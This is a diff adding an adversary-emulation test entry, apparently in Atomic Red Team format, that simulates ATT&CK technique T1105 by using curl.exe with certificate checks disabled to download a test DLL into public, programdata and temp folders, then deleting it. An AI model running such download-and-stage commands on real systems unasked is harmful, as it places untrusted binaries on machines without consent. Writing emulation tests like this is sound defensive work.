@@ -1,0 +1,29 @@
+---
+- id: d3623de707c5406dec7aef8827056cc2
+  name: Curl Download File
+  description: 'The following Atomic utilizes native curl.exe, or downloads it if
+    not installed, to download a remote DLL and output to a number of directories
+    to simulate malicious behavior.
+
+    Expected output will include whether the file downloaded successfully or not.
+
+    '
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: Ingress Tool Transfer
+  platforms:
+    windows:
+      cmd:
+        command: C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll
+          -o c:\users\public\music\allthethingsx64.dll && C:\Windows\System32\Curl.exe
+          -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll
+          --output c:\users\public\music\allthethingsx64.dll && C:\Windows\System32\Curl.exe
+          -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll
+          -o c:\programdata\allthethingsx64.dll && C:\Windows\System32\Curl.exe -k
+          https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll
+          -o %Temp%\allthethingsx64.dll
+        payloads: []
+        cleanup: del c:\users\public\music\allthethingsx64.dll >nul 2>&1 && del c:\users\public\music\allthethingsx64.dll
+          >nul 2>&1 && del c:\programdata\allthethingsx64.dll >nul 2>&1 && del %Temp%\allthethingsx64.dll
+          >nul 2>&1
